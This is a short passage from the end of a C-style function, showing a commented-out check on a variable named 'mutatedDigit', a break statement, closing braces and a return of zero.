        // if (mutatedDigit == 28) {
        //     break;
        // }
        break;
    }
    return 0;
}